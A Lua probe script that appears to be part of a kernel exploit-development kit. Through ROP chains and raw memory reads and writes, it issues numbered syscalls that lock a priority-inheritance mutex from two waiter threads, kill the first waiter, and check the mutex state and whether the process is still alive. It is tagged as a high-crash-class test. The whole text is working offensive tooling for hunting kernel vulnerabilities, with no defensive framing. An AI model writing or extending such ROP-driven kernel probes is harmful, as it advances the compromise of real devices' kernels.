-- CRASH_CLASS: HIGH
-- PROBE 653a: two waiters on one PI mutex, kill the first, owner unlocks
print("=== PROBE 653a: TWO PI WAITERS, FIRST KILLED ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local M=memory.alloc(8); wq(N(M),uint64(4))
local T1=memory.alloc(8); local T2=memory.alloc(8)
wq(N(T1),uint64(0)); wq(N(T2),uint64(0))
local ts=memory.alloc(0x10); wq(N(ts),uint64(0)); wq(N(ts)+8,uint64(400000000))
local cA=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
cA:push_syscall_with_ret(mk(240), U(N(ts)), uint64(0), uint64(0))
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(6), uint64(0))
local function waiter(tidbuf)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(mk(432), U(N(tidbuf)), uint64(0), uint64(0))
    c:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
    return c
end
local cb1=waiter(T1); local cb2=waiter(T2)
print("[A] chains built")
local ta=thread:new(cA); ta:run(true)
for i=1,120000 do local x=i end
print(string.format("[B] A locked M=%X",rd(N(M)) or 0))
local t1=thread:new(cb1); t1:run(true)
for i=1,120000 do local x=i end
local t2=thread:new(cb2); t2:run(true)
for i=1,120000 do local x=i end
print(string.format("[C] waiters tid1=%s tid2=%s M=%X",tostring(rd(N(T1))),tostring(rd(N(T2))),rd(N(M)) or 0))
local k1=rd(N(T1)) or 0
if k1>0 then
    local ok,rv=pcall(function() return mk(433)(U(k1),uint64(9),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    print(string.format("[D] kill(%s) rv=%s",tostring(k1),tostring(ok and rv or "err")))
end
for i=1,800000 do local x=i end
print(string.format("[E] after unlock M=%X",rd(N(M)) or 0))
print(string.format("[F] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] done")
